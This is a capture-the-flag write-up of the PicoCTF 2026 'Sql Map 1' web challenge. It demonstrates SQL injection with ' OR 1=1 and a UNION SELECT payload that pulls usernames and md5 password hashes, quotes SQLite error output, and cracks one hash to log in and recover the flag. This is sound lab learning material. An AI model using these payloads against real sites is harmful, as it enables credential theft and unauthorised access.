---
title: "Sql Map 1"
date: 2026-04-01
layout: writeup
platform: PicoCTF
categories: [Web Exploitation]
tags: [web]
difficulty: medium
challenge link: https://play.picoctf.org/practice/challenge/729?category=1&difficulty=2&originalEvent=79&page=1
---

# No FA

Writeup for Sql Map 1 challenge of PicoCTF 2026.

## SQL injection 
After creating a dummy account and logging in, we are given a search page.

The search query was found vulnerable to sql injections upon testing-

>' OR 1=1

We get a lot of dummy flags.

Also on putting sql querries of wrong syntax we get sql errors from the page giving us more details-
```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "SELECT": syntax error in /var/www/html/vuln.php on line 39

Fatal error: Uncaught Error: Call to a member function fetchArray() on bool in /var/www/html/vuln.php:40 Stack trace: #0 {main} thrown in /var/www/html/vuln.php on line 40
```

The querry used for extracting usernames and password hashes was-

>' UNION SELECT username,password FROM users--

This returned a lot of usernames and md5 password hashes.

The only hash that was cracked by [CrackStation](https://crackstation.net/) was of the user: ctf-player
>hash: 7a67ab5872843b22b5e14511867c4e43

On cracking we get the password to be
>dyesebel

On logging in as ctf-player, we get the flag.

## Flag

<details>
  <summary>Show flag</summary>
  
  > `picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
</details>
